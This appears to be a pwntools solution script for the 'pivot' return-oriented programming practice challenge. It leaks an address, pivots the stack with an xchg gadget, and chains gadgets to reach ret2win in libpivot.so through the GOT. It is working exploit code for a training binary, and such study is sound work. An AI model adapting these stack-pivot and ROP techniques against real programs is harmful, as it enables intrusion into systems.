from pwn import process, ELF, ROP, packing, context, gdb
context.log_level = 'critical'
# enable/disable aslr: echo 2 | sudo tee /proc/sys/kernel/randomize_va_space, echo 0 | sudo tee /proc/sys/kernel/randomize_va_space

e = ELF("pivot")
l = ELF("libpivot.so")
p = process(e.path)
r = ROP(e)
pid = gdb.attach(p) # opens a new shell for gdb debugging

rop_addr = p.recvuntil("> ").split(b":")[1].split(b"\n")[0].lstrip().decode()
print("pivot @: " + rop_addr)

'''
pop rax; ret
xchg rsp, rax; ret

allows us to set the stack pointer to anything we want. 


exploit logic:

1) set stack pointer to 0x7ffff7be4f10 using xchg

---rop chain---
2) call foothold_function - this updates its entry in the .got.plt table
3) alter .got.plt address of .got.plt to be the address of the ret2win function in libpivot:
- pop rax
- addr_of_plt_got_foothold_function
- mov rax, qword ptr [rax]
- pop rbp
- distance_to_plt_got of ret2win
- add rax, rbp ; rax will now contain the addr of ret2win
- call rax
'''

POP_RAX_RET = r.find_gadget(['pop rax', 'ret'])[0]
POP_RBP_RET = r.find_gadget(['pop rbp', 'ret'])[0]
XCHG_RSP_RAX_RET = 0x4009bd
ADD_RAX_RBP = 0x4009c4
CALL_RAX = 0x4006b0
MOV_RAX_PTR_RAX = 0x4009c0

junk = b"A" * 40
plt_foothold = l.symbols['foothold_function']   #location in libpivot.so
plt_ret2win = l.symbols['ret2win']              #location in libpivot.so
distance_foothold_to_ret2win = plt_ret2win - plt_foothold   #relative location in libpivot.so
got_foothold = e.got['foothold_function']       #.got location in ELF(pivot)
pivot_foothold_function = e.symbols['foothold_function']    # foothold_function location in ELF(pivot)


#input() #debug
#p.send(packing.p64(addr_foothold) + packing.p64(addr_ret2win))   #we can just stack pivot and then call ret2win directly if aslr disabled

### rop chain to call ret2win based on .got addr of ret2win which gets stored in eax

rop = [pivot_foothold_function, POP_RAX_RET, got_foothold, MOV_RAX_PTR_RAX , POP_RBP_RET, distance_foothold_to_ret2win, ADD_RAX_RBP, CALL_RAX]

rop_chain = b"".join([packing.p64(r) for r in rop])

p.send(rop_chain)
p.recvuntil("> ")

pivot = [POP_RAX_RET, int(rop_addr, 16), XCHG_RSP_RAX_RET]
pivot_chain = b"".join([packing.p64(r) for r in pivot])
p.send(junk + pivot_chain)
data = p.recvall(timeout=3)
print(data.split(b"\n")[2])